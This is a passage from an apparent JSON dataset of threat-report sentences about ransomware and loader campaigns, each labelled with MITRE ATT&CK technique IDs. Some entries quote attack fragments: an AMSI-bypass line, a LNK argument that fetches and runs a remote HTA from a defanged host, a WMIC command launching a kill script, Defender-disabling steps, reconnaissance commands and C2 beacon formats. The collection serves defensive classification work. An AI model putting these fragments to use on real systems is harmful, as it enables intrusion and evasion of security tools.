      "T1057",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Crypt the files After all these steps have been completed, it will create the ransom note on the desktop using the functions “SHGetFolderPathlW” and “CreateFileW”.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Subsequently, it will write the ransom note from the memory into a new file with the function “WriteFile”.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The batch script will delete the malware sample with its path using the command “del” and finally delete the bat file with the command “del %0%”.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Of course, as the malware uses the “del” command without destroying itself before the deletion, it can be recovered with some forensic tools with luck (the same can also be said for the bat file). ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "This way the malware tries to remove itself from the machine to avoid being detected and analyzed by security researchers: Figure 17.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Decryptor When a NetWalker victim goes through technical support (see an example of this below) and pays the ransom demanded by the group they will be able to download the decryptor to clean up their environment. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Conversation with NetWalker operators The download is done directly from the NetWalker Tor site, where the payment page switches to a download page certifying that the payment was made and received: Figure 19.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Decryptor execution At the end of the decryption process, the program indicates the number of decrypted files, deletes the ransom note if the user has checked that option, and terminates, leaving the user to resume their work peacefully: Figure 22.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "PsExec Native API (T1106): Use Windows API functions to inject DLL Windows Management Instrumentation (T1047) Persistence Registry Run Key (T1547.001):",
    "command": "",
    "labels": [
      "T1055",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Place a value on RunOnce key Modify Registry key (T1112): Create its own registry key in \\SOFTWARE\\<uniquename> Privilege Escalation Exploitation for Privilege Escalation (T1068): CVE-2020-0796, CVE-2019-1458, CVE-2017-0213, CVE-2015-1701 Process Injection (T1055.001): Reflective DLL Injection Defense Evasion Disabling Security Tools (T1562.001): ESET AV Remover, Trend Micro’s Security Agent Uninstall Tool, Microsoft Security Client Uninstall Process Injection (T1055.001): Reflective DLL Injection Deobfuscate/Decode Files or Information (T1140) Obfuscated Files or Information (T1027): PowerShell Script uses Base64 and hexadecimal encoding and XOR-encryption Credential Access Credential Dumping (T1003): Mimikatz, Mimidogz, Mimikittenz, Windows Credentials Editor, Pwdump, LaZagne Brute Force (T1110.001): NLBrute Discovery Network Service Scanning (T1046): SoftPerfect Network Scanner Security Software Discovery (T1518.001) ",
    "command": "",
    "labels": [
      "T1112",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "When ransoms are not paid, they have been known to shame victims by posting their data on the dark web. Technical Details Initial access Nefilim ransomware is distributed through exposed Remote Desktop Protocol (RDP) setups by brute-forcing them and using other known vulnerabilities for initial access, i.e. vulnerabilities in Citrix gateway devices.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Nefilim places a heavy emphasis on Remote Desktop Protocols. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "It has been also seen that Nefilim uses other tools to gather credentials that include Mimikatz, LaZagne, and NirSoft’s NetPass.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "It uses bat files to stop services/kill processes as shown in below image, and the stolen credentials are used to reach high-value machines like servers.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "/password:”password” process CALL CREATE “cmd.exe /c C:\\WINDOWS\\TEMP\\kill.bat\" Below images shows A batch file to stop services/kill processes Fig.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "It also drops and installs MegaSync to exfiltrate data. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It also makes use of API GetTickCount / QueryPerformanceCounter to get the number of ticks since the last system reboot.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "6 Anti debugging API Shell execute: Nefilim delete itself from the target systems after infection with the help of ShellExecute API \"C:\\Windows\\System32\\cmd.exe\" /c",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The file is actually a link (LNK) file that launches the legitimate script (C:\\Windows\\System32\\SyncAppvPublishingServer.vbs), which has a known issue of taking command line arguments.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The link file exploits this issue and feeds the legitimate script with the following command line argument to download and execute a remote “note.hta”: ;\\W_\\*2\\\\\\m_h_a_e ('http'+'://datacenter002[.]myftp[.]biz/documents/note.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The downloaded note.hta uses PowerShell to download another remote file hosted on hxxp://datacenter002[.]myftp[.]biz/documents/note[.]gif, which was not available at the time of our investigation.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Note.txt containing fake “QUARTERLY TAX PAYMENTS FOR 2022” data onedrive.vbs runs the previously created onedrive.ps1 filled with activities designed to hamper Windows Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": ".GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true) It also disables AMSI by hijacking the COM server, changing it from \"%windir%\\system32\\amsi.dll\" to \"C:\\IDontExist.dll\".",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The PowerShell script then performs the following actions to alter Windows Defender settings: Adds the following exclusions to Windows DefenderExtensions: .bat, .ppam, .xls, .docx, .bat, .exe, .vbs, .js ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "File paths: C:\\, D:\\, E:\\ Processes: explorer.exe, kernel32.dll, aspnet_compiler.exe, cvtres.exe, CasPol.exe, csc.exe, Msbuild.exe, ilasm.exe, InstallUtil.exe, jsc.exe, Calc.exe, powershell.exe, rundll32.exe, conhost.exe, Cscript.exe, mshta.exe, cmd.exe, DefenderisasuckingAntivirus, wscript.exe Allows known Windows Defender Threat IDs to execute Disables Windows Defender Attack Surface Reduction (ASR) rules Disables the following Windows Defender features:Intrusion Prevention System IO AV Protection (does not scan downloaded files and attachments) ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Realtime monitoring Script scanning Controlled folder access protection PUA protection Scheduled scan Sets Network Protection to audit mode in Windows Defender (allows users to visit known malicious sites but logs them in the event log) ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Disables MAPS (Microsoft Active Protection Service) reporting Never submits samples to Microsoft Allows severe/high/moderate/low-level threats to execute Disables the \"administrator in Admin Approval Mode\" user type (disables UAC prompts) Stops the WinDefend service (Windows Defender) Disables the startup of the WinDefend service Deletes the WinDefend service Creates a user named \"System32\" with the password “123” (no quotes) Adds the System32 user to both the \"administrators\" group and the \"Remote Desktop Users\" group Stops the Microsoft Defender Antivirus Network Inspection Service (WdNisSvc) Turns off Windows Firewall The PowerShell script finally uses reflective loading to load a binary into memory that injects XWorm RAT version 3.1. ",
    "command": "",
    "labels": [
      "T1055",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "As with the attack mentioned previously, these link files are disguised as PDF files to fool potential victims into opening them. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Running the link file triggers the download and execution of “doc.pdf” from “hxxp://datacenter11[.]myftp[.]org/notepad/”.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The “doc.pdf” is actually a VBA file that uses PowerShell to pull and run “hxxp://datacenter11[.]myftp[.]org/met/a[.]mp3”.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Based on our experience, they were likely lured via malicious links in spam emails. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Manual interactions are required up until the files inside the zip file are extracted, and the link file is manually run.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "However, it’s a link (shortcut) file, as seen in Figure 4. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Manually executing the lnk file triggers the download of wed.hta from hxxp://179.43.175[.]187/pqpf/ and saves it as %USERAPPDATA%\\wed.hta (SHA2: 0cbaf95b9d4df27442d753dc4cb600eda0a7ecb95e4071f380f69f5f3c89adb1).",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The PowerShell code sets the following registry entry to open the downloaded PDF file every time the computer boots and adds the HIDDEN file attribute to the file: ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\iXqrVo =",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The script then sleeps five seconds before downloading and executing whatever has been downloaded.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "TCywxTOvZk.wsf has only three meaningful lines of code out of almost 2840 lines and downloads and runs hxxp://[redacted].67[.]12:222/no[.]txt (SHA2: d7c63c4d488918aa09fcbd2012d041ed440377af51a87e757c40df3725b1eb07).",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "no.txt contains VBScript code that downloads and executes hxxp://[redacted].67[.]12:222/j[.]png (SHA2: 460d093a55b930e733c60575f82183cd0edd52ec6b927cdb4a93dc5da7f0ac9c), which is a PowerShell script that creates the following files: C:\\ProgramData\\Document\\py.ps1 C:\\ProgramData\\schtasks\\Microsoft.bat C:\\ProgramData\\Document\\x.ps1 The script then runs Microsoft.bat, which uses MSHTA.exe to run PowerShell code to run py.ps1.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The link file downloads and executes hxxp://[redacted].67[.]12:222/xa[.]hta xa[.]hta downloads and executes hxxp://[redacted].67[.]12:222/qDxcmqPPmI[.]wsf qDxcmqPPmI.wsf was not available at the time of the investigation.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "qDxcmqPPmI[.]wsf downloads and executes hxxp://[redacted].67[.]12:222/no[.]txt no[.]txt downloads and executes hxxp://[redacted].67[.]12:222/j[.]png j.png creates py.ps1 and x.ps1.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "But however potential victims end up with the “TaxReturn2022.img” and “TaxReturns2022.pdf.iso” files on their system, users still need to manually mount them and run the fake PDFs to trigger the infection chain.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "It also supports the command line argument -forcepath that is used to encrypt files in a specified directory.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Then it will iterate through the entire file system, encrypting files with a file extension of .basta. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It adds a custom icon to the registry, corresponding to the .basta icon, which is shown in Figure 3. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "PowerShell Black Basta has encoded PowerShell scripts to download additional scripts. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Windows Service Creates benign-looking services for the ransomware binary. T1574.001.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Windows Service Creates benign-looking services for the ransomware binary. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Indicator Removal on Host: File Deletion Attempts to delete malicious batch files. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Modify Registry Black Basta makes modifications to the Registry. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Impair Defenses: Disable or Modify Tools Disables Windows Defender with batch scripts, such as d.bat or defof.bat. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Impair Defenses: Disable or Modify System Firewall Uses batch scripts, such as rdp.bat or SERVI.bat, to modify the firewall to allow remote administration and RDP. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Credentials from Password Stores Black Basta uses Mimikatz to dump passwords. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "System Network Configuration Discovery Lists internal IP addresses to target in C:\\Windows\\pc_list.txt – typically found on the Domain Controller. T1082.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "System Information Discovery Uses GetComputerName to query the computer name. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Remote Desktop Protocol Black Basta has used RDP for lateral movement. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Data Encrypted for Impact Black Basta modifies the Desktop background by adding a .jpg in C:\\Temp and creating a registry key HKCU\\Control Panel\\Desktop.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Additionally modifies the registry to change the icon of encrypted files. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Four out of every five Fortune 500 companies, for example, use Microsoft 365 services [1]. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Malicious actors typically gain entry to organizations’ Microsoft 365 environments by abusing either stolen account credentials or stolen session cookies",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Darktrace regularly observes malicious actors behaving in predictable ways once they gain access to customer Microsoft 365 environment.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "‘PerfectData Software’ Activity Darktrace observed variations of the following pattern of activity relating to an application named ‘PerfectData Software’ within its customer base:Actor signs in to a Microsoft 365 account from an endpoint associated with a Virtual Private Server (VPS) or Virtual Private Network (VPN) serviceActor registers an application called 'PerfectData Software' with Azure AD, and then grants permissions to the applicationActor accesses mailbox data and creates inbox rule In two separate incidents, malicious actors were observed conducting their activities from endpoints associated with VPN services (HideMyAss (HMA) VPN and Surfshark VPN, respectively) and from endpoints within the Autonomous System AS396073 MAJESTIC-HOSTING-01. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "In March 2023, Darktrace observed a malicious actor signing in to a Microsoft 365 account from a Kuwait-based IP address within the Autonomous System, AS198605 AVAST Software s.r.o.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Figure 1: Advanced Search logs depicting the steps which the actor took after logging in to a user’s Microsoft 365 account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "In a separate case also observed by Darktrace in March 2023, a malicious actor was observed signing in to a Microsoft 365 account from an endpoint within the Autonomous System, AS397086 LAYER-HOST-HOUSTON.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Darktrace CoverageCases of ‘PerfectData Software’ activity chains detected by Darktrace typically began with an actor signing into an internal user’s Microsoft 365 account from a VPN or VPS-related endpoint.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The loader drops certain malware if certain conditions of the infected host are met (e.g., ARP table, domain check).The last BatLoader campaign performs the antivirus checks and is capable of modifying Windows UAC prompt, disabling Windows Defender notifications, disabling Task Manager, disabling command prompt, preventing users from accessing Windows registry tools, disabling the Run command, and modifying the display timeout.eSentire TRU assesses with high confidence that BatLoader will remain active in the wild in 2023 and potentially serve as a first stage payload to deliver other malware. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The malicious script resides under AI_DATA_SETTER action name and contains the instructions to download the malicious update.bat file from the C2 domain and place it under AppData\\Roaming folder (Figure 8).",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Figure 9: Contents of update.bat The requestadmin.bat is responsible for performing antivirus tampering – adding %APPDATA% and %USERPROFILE%\\ paths to Windows Defender exclusion to prevent Defender from scanning the mentioned paths.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The batch file was executed via nircmd.exe which was also downloaded from the C2; the utility allows the batch file to run in the background without displaying the user interface.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Besides excluding the paths, the batch file also retrieves and executes the runanddelete.bat and scripttodo.ps1 scripts from the C2 via a native PowerShell command Invoke-WebRequest (Figure 10). ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Figure 11: GnuPg installation Further down, the script enumerates the current domain that the user is logged into, the username, and obtains all entries within the IPs starting with 192., 10., and .172 in the ARP cache table.",
    "command": "",
    "labels": [
      "T1016",
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Once it completes that task, it then checks the amount of IPs found in the ARP table and completes a sum operation. ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "If the number of IPs is greater than 2, the domain is not in WORKGROUP and does not contain the username, which satisfies all the conditions set in the script, then the full set of malware is retrieved from C2 (Figure 12). ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The requests to the C2 server are performed in the following format: https://<C2 Server>/g5i0nq/index/d2ef590c0310838490561a205469713d/?servername=msi&arp=\"+ $IP_count + \"&domain=\" + $UserDomain + \"&hostname=\" + $UserPCname https://<C2 Server>/g5i0nq/index/fa0a24aafe050500595b1df4153a17fb/?servername=msi&arp=\"+ $IP_count + \"&domain=\" + $UserDomain + \"&hostname=\" + $UserPCname https://<C2 Server>/g5i0nq/index/i850c923db452d4556a2c46125e7b6f2/?servername=msi&arp=\"+ $IP_count + \"&domain=\" + $UserDomain + \"&hostname=\" + $UserPCname https://<C2 Server>/g5i0nq/index/b5e6ec2584da24e2401f9bc14a08dedf/?servername=msi&arp=\"+ $IP_count + \"&domain=\" + $UserDomain + \"&hostname=\" + $UserPCname Figure 12: Enumerating the host and retrieving malware from C2 based on the conditions If the mentioned conditions are not satisfied, the script retrieves the GPG-encrypted files: d2ef5.exe.gpg (encrypted Ursnif)p9d2s.exe.gpg (encrypted Vidar Stealer) ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Figure 13: GPG decryption snippet Moreover, the scripttodo.ps1 recursively removes the implementation of Windows Defender IOfficeAntiVirus under HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}.",
    "command": "",
    "labels": [
      "T1112",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "It then adds the extensions such as exe and DLL as exclusions to Windows Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The batch file is responsible for running a malicious executable d2ef5.exe with administrator privileges by creating a VBS script getadmin.vbs under %TEMP% folder to run the binary, but first the user would get an alert prompt from User Account Control (UAC) to allow the program to make changes. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution, ISFB creates a persistence via Registry Run Keys under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The command execution example: cmd /c start C:\\Users\\<username>\\VirtualStop.lnk",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "-ep unrestricted -file C:\\Users\\<username>\\CollectMirrow.ps1 The CollectMirror.ps1 script contains the PowerShell one-liner (Figure 15) that pulls the written data from the registry under HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\Microsoft\\<registry_value>>, specifically the TestMouse value (Figure 16). ",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Figure 15: Contents of CollectMirror.ps1 Figure 16: Contents of TestMouse registry value The script performs process injection using the API such as OpenThread (to create a handle to an existing process), VirtualAlloc (memory allocation in the chosen process), and QueueUserAPC, the thread that the APC (Asynchronous Procedure Calls) is queued to has to enter an alertable state, this can be achieved by invoking SleepEx as shown in Figure 17. ",
    "command": "",
    "labels": [
      "T1055",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "We have observed ISFB injecting itself into a running explorer.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Figure 17: Process injection We have observed ISFB injecting itself into a running explorer.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Part of the key is derived from the division operations from the value retrieved from API call GetSystemTimeAsFileTime (retrieving system time).",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The third blob contains the wordlist values shown below: ['list', 'stop', 'computer', 'desktop', 'system', 'service', 'start', 'game', 'stop', 'operation', 'black', 'line', 'white', 'mode', 'link', 'urls', 'text', 'name', 'document', 'type', 'folder', 'mouse', 'file', 'paper', 'mark', 'check', 'mask', 'level', 'memory', 'chip', 'time', 'reply', 'date', 'mirrow', 'settings', 'collect', 'options', 'value', 'manager', 'page', 'control', 'thread', 'operator', 'byte', 'char', 'return', 'device', 'driver', 'tool', 'sheet', 'util', 'book', 'class', 'window', 'handler', 'pack', 'virtual', 'test', 'active', 'collision', 'process', 'make', 'local', 'core'] These words are used to build the registry value names. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "0x11271c7f – timer 0x48295783 – timer 0x584e5925 – botnet 0x556aed8f – server 0x4fa8693e – key 0xd0665bf6 – domains 0x54432e74– directory 0xbbb5c71d – extension The traffic beaconing contains the following pattern that will be encrypted with the AES key extracted from the compressed blob: soft=%u&version=%u&user==%08x%08x%08x%08x &server=50&id=10101&crc=61f03b3&uptime=102696&action=%08x&dns=%s&whoami=%s&os=%s soft, version – version of the payload user – the value calculated from applying the RNG (Random Number Generator) algorithm, using the username, computer name, XOR operations, and cpuid call. ",
    "command": "",
    "labels": [
      "T1033",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "server – server ID id – botnet ID uptime – is the value based on the API calls QueryPerformanceFrequency and QueryPerformanceCounter dns – computer name os – OS version and system type The example of the encrypted with AES-128 beacon, replacing + with _2B and / with _2F, the / are also being added: /uploaded/V1jd62QM3JcPMZGTpdjl2I/mEcoduKcJlNZo/S1Tq0KYy/M2ZEZFPG3iasm8TVeZ5oYf7/m_2FHfl318/E2HneynLJsT2KcKW6/MBeMivC1RFEh/TAL8bLaLD_2/B1Hg1OTg4XQwlG/IJbZJIe0rxQ0SYwzWgYte/TfzvWXXywf9HHwRL/2ZSv_2BcgktHGaZ/hRo7dwwYV3D39_2Bmc/JmEz3Z359/UhGcxj4s_2F80Krry3Kf/tI6i_2BxIXB2d6WASfJ/NCIpYT61pYgL53jx8SghJH/pQnAADp6racXs/VdB_2FRy/o74GaLVJG9neXweATdYNR/5.pct Some interesting strings found: /data.php?version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&type=%u&name=%s \\Software\\Microsoft\\Windows\\CurrentVersion SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings %",
    "command": "",
    "labels": [
      "T1082",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Cmd %s processed: %u Cmd %u parsing: %u cmd /C",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "\"%s> %s1\" wmic computersystem get domain |more systeminfo.exe tasklist.exe /SVC > driverquery.exe > reg.exe query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s > ",
    "command": "",
    "labels": [
      "T1012",
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "USERPROFILE%\\AppData\\Roaming\\Thunderbird\\Profiles\\*.default \\logins.json /C pause dll cache2\\entries\\*.* ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "cmd /c start %",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The stealer then collects the credentials, host information, files, and screenshot and sends it over as a ZIP archive in a base64-encoded format as shown in Figure 30. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "SystemBC RAT also known as “socks5 backconnect system” (MD5: 8ea797eb1796df20d4bdcadf0264ad6c) is a malware that leverages SOCKS5 proxies to hide malicious traffic, it also has the capability of sending additional payloads to the hosts (Figure 31). ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Figure 31: Leaked SystemBC on a hacking forum The RAT creates the mutex “wow64” with the “start” as an argument (“start” will also be used as an argument for the scheduled task command).",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "If the value is not equal to 1000, it proceeds with scheduled task creation, the task name is “wow64.exe”.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The command to run the scheduled task every 2 minutes is start. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Figure 32: Function responsible for calling C2, task scheduling, and mutex creation SystemBC is capable of executing scripts and commands retrieved from C2 such as ps1, bat, vbs, and exe (Figure 33). ",
    "command": "",
    "labels": [
      "T1053.005",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Instead, the installer pushes “avolkov.exe” binary to the infected machine and creates the registry key containing the path of the dropped binary which is AppData/Local/ SetupProject1 (Figure 34). ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Figure 34: Malicious MSI installer creating the registry key and dropping the binary file under AppData/Local/SetupProject1 The avolkov.exe binary (MD5: d41e0fee0ec6c2e3da56a6dcf53607da) utilizes libcurl 7.85.0 which enables the data transfer with URL syntax for protocols such as HTTP/HTTPS, FTP, DICT, SMTP, IMAP, POP3, LDAP, acting as a potential backdoor and loader.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The batch script is responsible for pulling additional BatLoader payloads and scripts from C2 such as: requestadmin.bat nircmd.exeuser.ps1checkav.ps1scripttodo.ps1 Figure 35: Contents of newtest.bat The requestadmin.bat (Figure 36) retrieved from the second campaign is different compared to the first campaign.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor(s) made sure to add more paths and folders to Windows Defender exclusion including %TEMP% and C:\\Windows\\* as well as adding .ps1",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "(PowerShell) extension to the exclusion list. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "We observed that the script retrieves NSudo and modifies Windows UAC prompt behavior by allowing administrators to perform operations without authentication or consent prompts: Disabling Windows Defender notifications, Disabling Task Manager, Disabling command prompt, Preventing users from accessing Windows registry tools, Disabling Run command, Modifying the display timeout (monitor powers off after 30 minutes) and sleep mode (on AC/battery power – goes to sleep after 3000 minutes (50 hours)). ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Figure 36: Contents of requestadmin.bat The scripttodo.ps1 file still retrieves the same files from the C2, the Cobalt Strike payload (d655) was changed to a DLL instead of EXE and shutdowni.bat is no longer pulled from the C2. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "user.ps1 (Figure 37) is similar to scriptodo.ps1 in terms of enumerating the current domain of the host, username, and ARP table. ",
    "command": "",
    "labels": [
      "T1016",
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "If the conditions are not met and the host belongs to the workgroup, the script retrieves the Cobalt Strike payload named installv2.dll (MD5: 4a6898a4584fdfb34bbeefc77bc882c4) and runs it via rundll32.exe with an ordinal “SRANdomsrt”. ",
    "command": "",
    "labels": [
      "T1105",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Appendix https://www.mandiant.com/resources/blog/seo-poisoning-batloader-aterahttps://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/https://raw.githubusercontent.com/adbertram/Random-PowerShell-Work/master/Security/GnuPg.psm1https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls?redirectedfrom=MSDNhttps://www.0ffset.net/reverse-engineering/malware-analysis/analysing-isfb-loader/https://www.0ffset.net/reverse-engineering/malware-analysis/analyzing-isfb-second-loader/https://www.0ffset.net/reverse-engineering/challenge-1-gozi-string-crypto/https://research.openanalysis.net/config/python/yara/isfb/rm3/gozi/2022/10/06/isfb.htmlhttps://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-mars-stealerhttps://www.secureworks.com/404?aspxerrorpath=/research/gozihttps:/www.secureworks.com/research/gozihttps://owasp.org/www-community/attacks/Man-in-the-browser_attack Indicators of Compromise Name Indicators BatLoader C2 updatea1[.]com BatLoader C2 externalchecksso[.]com BatLoader C2 